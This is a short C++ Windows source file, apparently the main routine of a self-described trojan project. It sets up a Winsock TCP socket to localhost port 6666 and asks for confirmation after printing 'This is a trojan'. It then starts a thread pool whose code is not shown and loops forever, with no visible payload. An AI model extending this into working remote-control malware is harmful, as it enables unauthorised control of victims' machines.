#pragma comment(lib, "Ws2_32.lib")

#include <WinSock2.h>
#include <iostream>
#include <thread>
#include <string>
#include <cstdio>
#include <memory>
#include <stdexcept>
#include <string>
#include <vector>
#include <array>

#include "ThreadPool.h"
#include "StopAllThreads.h"
// #include "RandomMouse.h"

using namespace std;

#define PORT_NUM (6666)

int main()
{
  string confirm;
  char message[200];

  //Winsock-DLL
  int r;
  WSAData wsaData;
  WORD DLLVersion;
  DLLVersion = MAKEWORD(2,1);
  r = WSAStartup(DLLVersion, &wsaData);

  // Create addr
  SOCKADDR_IN addr;
  int addlen = sizeof(addr);

  // Create socket
  SOCKET sConnect;
  sConnect = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  addr.sin_addr.s_addr = inet_addr("127.0.0.1");
  addr.sin_family = AF_INET;
  addr.sin_port = htons(PORT_NUM);

  cout << "[WARNING] This is a trojan. Do u really want to start? [Y] or [N]" << endl;
  cin >> confirm;

  if (confirm == "N") {
      exit(1);
  } else {
      StopAllThreads sat;
      // Create thread pool
      ThreadPool tp;
      tp.setThread(&sat);
      
      cout << "ends!" << endl;
      while(1) {
        
      }
  }
  return 0;
}
